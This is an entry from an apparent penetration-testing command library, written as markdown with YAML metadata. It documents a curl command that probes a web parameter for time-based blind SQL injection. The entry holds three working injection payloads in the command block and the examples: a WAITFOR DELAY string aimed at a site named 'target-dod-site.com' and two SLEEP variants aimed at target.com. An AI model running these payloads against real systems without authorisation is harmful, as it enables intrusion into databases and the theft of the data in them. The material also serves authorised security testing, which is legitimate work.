---
id: cmd-uuid-2
name: curl-time-based-test
type: command
executor: bash
data: >-
  curl "https://target-dod-site.com/page?id=1'; WAITFOR DELAY '0:0:5'--"
  --max-time 10
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.103Z'
platforms:
  - Linux
  - macOS
tags:
  - sqli
  - testing
verified: false
validated: true
submitted: true
---

# curl-time-based-test

## Command

```bash
curl "https://target-dod-site.com/page?id=1'; WAITFOR DELAY '0:0:5'--" --max-time 10
```

## Description

Tests for time-based blind SQLi by injecting a delay function and timing the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id=1'; WAITFOR DELAY '0:0:5'--` | Time delay payload | Yes |
| `--max-time 10` | Timeout after 10s | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com/page?id=1'; SLEEP(5)--" --max-time 10
```

### Advanced Usage

```bash
curl -s "https://target.com/page?id=1' AND IF(1=1, SLEEP(5), 0)--"
```

## Expected Output

Delayed response (~5s) if vulnerable; quick failure otherwise.

## Related

- [[Related Procedure]]
